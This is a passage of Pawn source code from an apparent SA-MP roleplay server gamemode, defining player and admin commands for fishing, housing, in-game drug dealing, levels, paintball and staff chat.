	if(VaildFishPlace(playerid) && !IsPlayerInAnyVehicle(playerid))
	{
        if(PlayerInfo[playerid][pFishes] > 0) return SCM(playerid,COLOR_SERVER,"Go to a store 24/7 to sell fish caught before the fish again.");
		if(Fishing[playerid] == 1) return SCM(playerid,COLOR_SERVER,"You are already fishing.");
		TogglePlayerControllable(playerid, 0);
		LoopingAnim(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,1,1);
		Fishing[playerid] = 1;
		FishTimer[playerid] = 20;
		SendClientMessage(playerid, COLOR_SERVER, "You're now fishing. It will take a few seconds to reel your fish in.");
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "You are not in the fishing zone. [/jobs > Fisherman]");
	return 1;
}
CMD:unrentroom(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    if(PlayerInfo[playerid][pSleeping] == 1) return SendClientMessage(playerid, COLOR_ERROR, "You sleeping, use /sleep first.");
	{
		if(PlayerInfo[playerid][pPhousekey] != 999) return SendClientMessage(playerid, COLOR_SERVER, "{B8DBFF}You own this house.");
		if(PlayerInfo[playerid][pRented] == -1) return SCM(playerid, COLOR_SERVER, "{B8DBFF}You don't have rent a house.");
		PlayerInfo[playerid][pRented] = -1;
		SendClientMessage(playerid, COLOR_SERVER, "{B8FFDB}You are now homeless.");
		Update(playerid,pCashx);
		Update(playerid,pRentedx);
	}
	return 1;
}
CMD:up(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	    {
		    new up;
			if(sscanf(params, "d",up)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/up <Size>");
		    new Float:slx, Float:sly, Float:slz;
	        GetPlayerPos(playerid, slx, sly, slz);
	        SetPlayerPosEx(playerid, slx, sly, slz+up);
		}
		else return SCM(playerid,COLOR_SERVER,"{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	}
	return 1;
}
CMD:time(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new sendername[25],string[256];
	new hour,minute,second;
	gettime(hour,minute,second);
	format(string, sizeof(string), "The current time is %d:%s%d (%d seconds).", hour, (minute < 10) ? ("0") : (""), minute, second);
	SendClientMessage(playerid, COLOR_SERVER, string);
	format(string, sizeof(string), "Connected for %d seconds.", PlayerInfo[playerid][pPayDay]);
	SendClientMessage(playerid, COLOR_SERVER, string);
	GetPlayerName(playerid, sendername, sizeof(sendername));
	format(string, sizeof(string), "* %s raises her hand and looks down at her watch.", sendername);
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0);
	return 1;
}
CMD:open(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new idcasa;
		if(sscanf(params, "i", idcasa)) return SCM(playerid, -1, "/open [1 - house / 2 - vip house / 3 - business]");
		if(idcasa == 1)
		{
			for(new i = 1; i < sizeof(HouseInfo); i++)
			{
				if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) || PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
				{
					if(PlayerInfo[playerid][pPhousekey] == i)
					{
						if(HouseInfo[i][hLock] == 1)
						{
							HouseInfo[i][hLock] = 0;
							GameTextForPlayer(playerid, "~w~Door ~g~Unlocked", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Lockk`='0' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
						if(HouseInfo[i][hLock] == 0)
						{
							HouseInfo[i][hLock] = 1;
							GameTextForPlayer(playerid, "~w~Door ~r~Locked", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Lockk`='1' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}This is not your house.");
				}
			}
		}
		if(idcasa == 2)
		{
			for(new i = 1; i < sizeof(HouseInfo); i++)
			{
				if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) || PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
				{
					if(PlayerInfo[playerid][pPhousekey2] == i)
					{
						if(HouseInfo[i][hLock] == 1)
						{
							HouseInfo[i][hLock] = 0;
							GameTextForPlayer(playerid, "~w~Door ~g~Unlocked", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Lockk`='0' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
						if(HouseInfo[i][hLock] == 0)
						{
							HouseInfo[i][hLock] = 1;
							GameTextForPlayer(playerid, "~w~Door ~r~Locked", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Lockk`='1' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
					}
					else return SendClientMessage(playerid, COLOR_ERROR, "This is not your house VIP.");
				}
			}
		}
		if(idcasa == 3)
		{
			for(new i = 1; i < sizeof(BizzInfo); i++)
			{
				if(BizzInfo[i][bSbiz] > 0) return 1;
				if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || PlayerToPoint(3, playerid,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ]))
				{
					if(PlayerInfo[playerid][pPbiskey] == i)
					{
						if(BizzInfo[i][bLocked] == 1)
						{
							BizzInfo[i][bLocked] = 0;
							GameTextForPlayer(playerid, "~w~Bussiness ~g~Open", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `bizz` SET `Locked`='0' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
						if(BizzInfo[i][bLocked] == 0)
						{
							BizzInfo[i][bLocked] = 1;
							GameTextForPlayer(playerid, "~w~Bussiness ~r~~h~Closed", 5000, 6);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							new str2[128];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE `bizz` SET `Locked`='0' WHERE `ID`='%d'",i);
							mysql_tquery(SQL,str2,"","");
							return 1;
						}
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a bussines.");
				}
			}
		}	
    }
    return 1;
}
CMD:usedrugs(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
        if(UsingDrugs[playerid] == 0)
        {
			if(PlayerInfo[playerid][pDrugs] >= 2)
    	    {
    	        PlayerStoned[playerid] += 2;
    		    if(PlayerStoned[playerid] >= 2) { GameTextForPlayer(playerid, "~w~You are~n~~p~Stoned", 4000, 1); }
                new Float:health;
                GetPlayerHealth(playerid, health);
                if(health >= 90.0)
                {
                	SetPlayerHealthEx(playerid, 100);
				}
				else
				{
    				SetPlayerHealthEx(playerid, health + 10.0);
				}
				new sendername[25];
                GetPlayerName(playerid, sendername, sizeof(sendername));
                SendClientMessage(playerid, COLOR_SERVER, "{999999}You used 2 grams of drugs.");
				new string[128];
		        format(string, sizeof(string), "%s has just took some drugs.", sendername);
                ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                PlayerInfo[playerid][pDrugs] -= 2;
		        UsingDrugs[playerid] = 1;
                drug[playerid] = SetTimerEx("DrugEffectGone",30000,false,"d",playerid);
				new str2[128];
				mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `Money`='%d',`Drugs`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str2,"","");
            }
        	else
          	{
      	    	SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have drugs anymore.");
            }
	    }
        else
		{
            SendClientMessage(playerid, COLOR_SERVER, "{999999}Wait until you recover.");
        }
	}//not connected
	return 1;
}
CMD:getdrugs(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pJob] != 4) return SCM(playerid,COLOR_SERVER,"{FFF8C6}You are not a Drugs Dealer.");
		if(!IsPlayerInRangeOfPoint(playerid, 5.0, 322.9745,1119.4409,1083.8828)) return SCM(playerid,COLOR_SERVER,"{FFF8C6}You are not the place where you can get drugs.");
	    new points;
	    new dpoints = PlayerInfo[playerid][pDrugs];
	    if(sscanf(params, "i", points)) return SCM(playerid, COLOR_SERVER, "Usage: /getdrugs [amount]");
	    new totaldrugs = dpoints + points;
	    if(points < 1) return SCM(playerid, COLOR_SERVER,"Numar invalid");
	    if(totaldrugs > 99) return SCM(playerid, COLOR_SERVER, "You can not hold so many drugs you.");
	    new money = points * 1000;
		if(GetPlayerCash(playerid) < money) return SCM(playerid,COLOR_SERVER,"You do not have enough money.");
		PlayerInfo[playerid][pDrugs] += points;
		GivePlayerCash(playerid,-money);
		new string[64];
		format(string,sizeof(string),"Bought %d grams of drugs $%s",points,FormatNumber(money));
		SCM(playerid,COLOR_SERVER,string);
		new str2[128];
		mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `Money`='%d',`Drugs`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pNormalName]);
		mysql_tquery(SQL,str2,"","");
		return 1;
	}
	return 1;
}
CMD:selldrugs(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pJob] != 4) return SendClientMessage(playerid, COLOR_GREY, "{FFB870}You are not a Drugs Dealer.");
		new playa,needed,string[128],giveplayer[25],sendername[25],money;
		if(sscanf(params, "uii",playa,needed,money)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/selldrugs <Name/Playerid> <Drugs> <Price>");
		if(needed < 1 || needed > 50) return SendClientMessage(playerid, COLOR_SERVER,"{FFF8C6}Grams not lower then 1, or above 50.");
		if(money < 1 || money > 50000) return SendClientMessage(playerid, COLOR_SERVER,"{FFF8C6}Price not lower then 1$, or above 50,000$.");
    	if(needed > PlayerInfo[playerid][pDrugs]) return SendClientMessage(playerid, COLOR_SERVER,"{FFF8C6}You dont have that much Drugs with you.");
    	if(IsPlayerConnected(playa))
    	{
    	    if(playa != INVALID_PLAYER_ID)
		    {
 	     		if (ProxDetectorS(8.0, playerid, playa))
        		{
            	    if(playa == playerid) return SendClientMessage(playerid, COLOR_SERVER,"{FFF8C6}Cant sell to yourself.");
	        	    GetPlayerName(playa, giveplayer, sizeof(giveplayer));
	        		GetPlayerName(playerid, sendername, sizeof(sendername));
	        	    format(string, sizeof(string), "{B8FFDB}* You offerd %s to buy %d gram of drugs for $%s.", giveplayer, needed, FormatNumber(money));
	        		SendClientMessage(playerid, COLOR_SERVER, string);
	         		format(string, sizeof(string), "{B8FFDB}* Drug Dealer %s wants to sell you %d gram for $%s, (type /accept drugs %d) to buy.", sendername, needed, FormatNumber(money),playerid);
		        	SendClientMessage(playa, COLOR_SERVER, string);
		         	DrugOffer[playa] = playerid;
		        	DrugPrice[playa] = money;
		        	DrugGram[playa] = needed;
	    		}
		    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
        	}
    	}
     	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:bizstatus(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new bouse = PlayerInfo[playerid][pPbiskey];
		if(bouse == 255) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't own a business.");
		PrintBizInfo(playerid,bouse);
	}
	return 1;
}
CMD:gotohouse(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 5)
	    {
			new housenum,string[128],name[30];
			if(sscanf(params, "d",housenum)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/house <House ID>");
			GetPlayerName(playerid, name, sizeof(name));
			format(string,sizeof(string),"%s used /gotohouse %d.",name,housenum);
			ABroadCast(COLOR_ADMCOMMANDS,string,1);
			SetPlayerInterior(playerid,HouseInfo[housenum][hInterior]);
			SetPlayerPosEx(playerid,HouseInfo[housenum][hExitx],HouseInfo[housenum][hExity],HouseInfo[housenum][hExitz]);
			PlayerInfo[playerid][pInt] = HouseInfo[housenum][hInterior];
			PlayerInfo[playerid][pLocal] = housenum;
			InHouse[playerid] = housenum;
			SetPlayerVirtualWorld(playerid,HouseInfo[housenum][hVirtual]);
			if(strlen(housestring[InHouse[playerid]]) > 0)
			{
   				StopAudioStreamForPlayer(playerid);
				PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
			}
		}
		else return SCM(playerid,COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:houseo(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 5)
	    {
			new housenum;
			if(sscanf(params, "d",housenum)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/houseo <House ID>");
			SetPlayerPosEx(playerid,HouseInfo[housenum][hEntrancex],HouseInfo[housenum][hEntrancey],HouseInfo[housenum][hEntrancez]);
		}
		else return SCM(playerid,COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:gotobiz(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 5)
	    {
			new housenum,string[128],name[30];
			if(sscanf(params, "d",housenum)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/biz <Biz ID>");
			if(housenum < 0 || housenum > 52) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid BIZ ID.");
			SetPlayerPosEx(playerid,BizzInfo[housenum][bEntranceX],BizzInfo[housenum][bEntranceY],BizzInfo[housenum][bEntranceZ]);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			GetPlayerName(playerid, name, sizeof(name));
			format(string,sizeof(string),"%s used /gotobiz %d.",name,housenum);
			ABroadCast(COLOR_ADMCOMMANDS,string,1);
		}
		else return SCM(playerid,COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:buylevel(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new nxtlevel = PlayerInfo[playerid][pLevel];
		new costlevel;
		new expamount,string[128],sendername[30];
		if(PlayerInfo[playerid][pLevel] == 1 || PlayerInfo[playerid][pLevel] == 2 || PlayerInfo[playerid][pLevel] == 3 || PlayerInfo[playerid][pLevel] == 4)
		{
		    expamount = nxtlevel*2;
		    costlevel = nxtlevel*4000;
		}
		else if(PlayerInfo[playerid][pLevel] >= 5)
		{
		    expamount = nxtlevel*levelexp;
		    costlevel = nxtlevel*levelcost;
		}
		if (gPlayerLogged[playerid] != 0)
		{
		    GetPlayerName(playerid,sendername,sizeof(sendername));
			if(GetPlayerCash(playerid) < costlevel) return SCM(playerid,COLOR_GRAD1,"You do not have enough cash.");
			if(PlayerInfo[playerid][pExp] < expamount) return SCM(playerid,COLOR_GRAD1,"You do not have the necessary number of respect points.");
			GivePlayerCash(playerid, -costlevel);
			PlayerInfo[playerid][pLevel]++;
		    PlayerInfo[playerid][pExp] -= expamount;
		    format(string,sizeof(string),"{3A8EBA}Congratulations, now you level %d!",PlayerInfo[playerid][pLevel]);
			SCM(playerid,COLOR_SERVER,string);
			format(string, sizeof(string), "* %s Now has level %d.",sendername,PlayerInfo[playerid][pLevel]);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
			getdate(y,m,d);
			gettime(h,mi,s);
			format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] used /buylevel and now have level %d.",d,m,y,h,mi,s,sendername,PlayerInfo[playerid][pSQLID],PlayerInfo[playerid][pLevel]);
			mysql_real_escape_string(string2, string3);
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','0','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
			mysql_tquery(SQL,var100,"","");
		    new total = PlayerInfo[playerid][pExp];
		    if(total > 0)
		    {
		        PlayerInfo[playerid][pExp] = total;
		    }
		    else
		    {
		        PlayerInfo[playerid][pExp] = 0;
		    }
		    Update(playerid,pCashx);
		    Update(playerid,pRP);
			Update(playerid,pLevelx);
			SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
			new sqlupdate[1000];
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET RPReff=RPReff+2,BaniReff=BaniReff+%d WHERE `id`='%d'",costlevel/2,PlayerInfo[playerid][pReferral]);
			mysql_tquery(SQL, sqlupdate, "", "");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You are not logged in.");
	}
	return 1;
}
CMD:funarea(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid,3.0, 1154.4122,-1440.0548,15.7969))
		{
			ShowPlayerDialog(playerid, DIALOG_FUNAREA, DIALOG_STYLE_TABLIST, "Server: Fun Area","PaintBall\tYou fired a gun expert? Then show us!\nDrag Race\tYou like speed? Then win!", "Select", "CANCEL");
		}
		else return SCM(playerid, COLOR_ERROR, "You're not fun area");
	}
	return 1;
}	
CMD:paint(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		SCM(playerid, COLOR_SERVER, "Comanda noua: /funarea");
	}
	return 1;
}
CMD:paintleave(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pPaintBallG] > 0)
	    {
	        new string [128],sendername[30];
	        GetPlayerName(playerid, sendername, sizeof(sendername));
			foreach(Player, i)
			{
			    if(PlayerInfo[i][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
			    {
			        format(string,sizeof(string),"{0066FF}PaintBall: {FFFFFF}%s left paintball arena.", sendername);
			        SendClientMessage(i, COLOR_YELLOW, string);
				}
			}
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			SetPlayerHealthEx(playerid, 100.0);
			curatj[playerid] = 0;
			for (new i = 0; i != 5; ++i) SendDeathMessageToPlayer(playerid, 1001, 1001, 1001);
			for(new i = 0; i < sizeof(PaintTD); i++) { PlayerTextDrawHide(playerid, PaintTD[i]); }
			paint_jucatori--;
	        PlayerInfo[playerid][pPaintBallG] = 0;
	        PlayerInfo[playerid][pPaintBallKills] = 0;
	        ResetPlayerWeaponsEx(playerid);
		    ResetPlayerWeapons(playerid);
		    SetPlayerArmourEx(playerid, 0);
		    SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid,0);
		    SetPlayerToTeamColor(playerid);
		    SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
		    SetPlayerPos(playerid, 1154.4122,-1440.0548,15.7969);
			SetCameraBehindPlayer(playerid);
			T_SAU_CT[playerid] = -1;
			ResetPlayerWeapons(playerid);
			TogglePlayerControllable(playerid, 1);
			if(paint_jucatori == 1)
			{
				foreach(Player, i)
				{
					if(PlayerInfo[i][pPaintBallG] == 1)
					{
						for(new x = 0; x < sizeof(PaintTD); x++) { PlayerTextDrawHide(i, PaintTD[x]); }
						PlayerTextDrawSetString(i, PaintTD[3], "SE_ASTEAPTA_JUCATORI...");
						PlayerTextDrawShow(i, PaintTD[0]);
						PlayerTextDrawShow(i, PaintTD[1]);
						PlayerTextDrawShow(i, PaintTD[2]);
						PlayerTextDrawShow(i, PaintTD[3]);
						incamerapaintball[i] = 2;
						SpawnPlayer(i);
					}
				}
			}
			if(paint_jucatori < 1) { timp_paint = -1; paint_incepe = -1; paint_jucatori = 0; }
		}
	}
	return 1;
}
CMD:leavepaint(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    return cmd_paintleave(playerid, params);
	}
	return 1;
}
CMD:bigears(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    new string[256],sendername[30];
	    GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
		if (!BigEar[playerid])
		{
			BigEar[playerid] = 1;
			SendClientMessage(playerid, COLOR_SERVER, "{999999}Your ears have grown.");
			format(string, sizeof(string), "{C1F589}Admin %s has activated /bigears.",sendername);
			ABroadCast(COLOR_SERVER, string,6);
		}
		else if (BigEar[playerid])
		{
			(BigEar[playerid] = 0);
			SendClientMessage(playerid, COLOR_SERVER, "{999999}Your ears have shrank.");
			format(string, sizeof(string), "{C1F589}Admin %s has deactivated /bigears.",sendername);
			ABroadCast(COLOR_SERVER, string,6);
		}
	}
	return 1;
}
CMD:aaa2(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pHelper] > 0)
		{
		    SetPlayerVirtualWorld(playerid, 1);
	    	SetPlayerInterior(playerid, 0);
	    	SetPlayerPosEx(playerid, 1477.1122,1713.9915,10.8125);
	    	SendClientMessage(playerid, COLOR_SERVER, "Welcome to LV airport (in virtual world).");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You are not an helper/admin.");
	}
	return 1;
}
CMD:ha(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_BLUE, "You need to login first.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pHelper] > 0)
		{
			new string[250],result[250],sendername[25];
			if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_WHITE, "{00FF00}Usage:{FFFFFF} /ha <Message>");
	   		GetPlayerName(playerid, sendername, sizeof(sendername));
	    	{
                new arank[64];
			    if(PlayerInfo[playerid][pHelper] == 1) { arank = "Helper Level 1"; }
				else if(PlayerInfo[playerid][pHelper] == 2) { arank = "Helper Level 2"; }
				else if(PlayerInfo[playerid][pHelper] == 3) { arank = "Helper Level 3"; }
				else if(PlayerInfo[playerid][pHelper] == 4) { arank = "Helper Leader"; }
				else if(PlayerInfo[playerid][pAdmin] == 1) { arank = "AdminLvL(1)"; }
				else if(PlayerInfo[playerid][pAdmin] == 2) { arank = "AdminLvL(2)"; }
				else if(PlayerInfo[playerid][pAdmin] == 3) { arank = "AdminLvL(3)"; }
				else if(PlayerInfo[playerid][pAdmin] == 4) { arank = "AdminLvL(4)"; }
				else if(PlayerInfo[playerid][pAdmin] == 5) { arank = "AdminLvL(5)"; }
				else if(PlayerInfo[playerid][pAdmin] == 6) { arank = "Supervisor"; }
				else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Hoster"; }
				else if(PlayerInfo[playerid][pAdmin] == 8) { arank = "Hoster+"; }
				else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "Hoster++"; }
				else if(PlayerInfo[playerid][pAdmin] == 10) { arank = "Manager"; }
				else if(PlayerInfo[playerid][pAdmin] == 11) { arank = "Host Provider"; }
				else if(PlayerInfo[playerid][pAdmin] == 12) { arank = "Web Developer"; }
				else if(PlayerInfo[playerid][pAdmin] == 13) { arank = "Script Developer"; }
				else if(PlayerInfo[playerid][pAdmin] == 14) { arank = "Founder"; }
	     		format(string, sizeof(string), "{0000FF}%s {33CCFF}%s:{FFFFFF} %s {0000FF}", arank, sendername, result);
	     		ABroadCast(COLOR_ADMIN, string,1);
	     		HLChat(COLOR_ADMIN,string);
	    	}
        }
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:a(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_BLUE, "You need to login first.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] > 0)
		{
			new string[250],result[250],sendername[25];
			if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_WHITE, "{00FF00}Usage:{FFFFFF} /a <Message>");
	   		GetPlayerName(playerid, sendername, sizeof(sendername));
	    	if(PlayerInfo[playerid][pAdmin] > 0)
			{
                new arank[64];
				if(PlayerInfo[playerid][pAdmin] == 1) { arank = "AdminLvL(1)"; }
				else if(PlayerInfo[playerid][pAdmin] == 2) { arank = "AdminLvL(2)"; }
				else if(PlayerInfo[playerid][pAdmin] == 3) { arank = "AdminLvL(3)"; }
				else if(PlayerInfo[playerid][pAdmin] == 4) { arank = "AdminLvL(4)"; }
				else if(PlayerInfo[playerid][pAdmin] == 5) { arank = "AdminLvL(5)"; }
				else if(PlayerInfo[playerid][pAdmin] == 6) { arank = "Supervisor"; }
				else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Hoster"; }
				else if(PlayerInfo[playerid][pAdmin] == 8) { arank = "Hoster+"; }
				else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "Hoster++"; }
				else if(PlayerInfo[playerid][pAdmin] == 10) { arank = "Manager"; }
				else if(PlayerInfo[playerid][pAdmin] == 11) { arank = "Host Provider"; }
				else if(PlayerInfo[playerid][pAdmin] == 12) { arank = "Web Developer"; }
				else if(PlayerInfo[playerid][pAdmin] == 13) { arank = "Script Developer"; }
				else if(PlayerInfo[playerid][pAdmin] == 14) { arank = "Founder"; }
				format(string, sizeof(string), "{C60000}%s {33CCFF}%s:{FFFFFF} %s {C60000}", arank, sendername, result);
			}
			ABroadCast(COLOR_ADMCHAT, string,1);
        }
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:cw(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerInAnyVehicle(playerid))
    {
		new result[250],sendername[25],string[250];
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/cw <Message>");
		GetPlayerName(playerid, sendername, sizeof(sendername));
	    format(string, sizeof(string), "(Car Whisper) %s[%d]: %s", sendername, playerid, result);
        foreach(Player,i)
        {
            if(IsPlayerConnected(i))
            {
                if(IsPlayerInVehicle(i, GetPlayerVehicleID(playerid)))
                {
                    SendClientMessage(i,COLOR_YELLOW, string);
                }
            }
        }
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(car whisper) %s",result);
		mysql_real_escape_string(strr, resulttt);
        return 1;
    }
    else
	{
		SendClientMessage(playerid, COLOR_SERVER,"{FFF8C6}You need to be in vehicle.");
	}
    return 1;
}
CMD:skydive(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
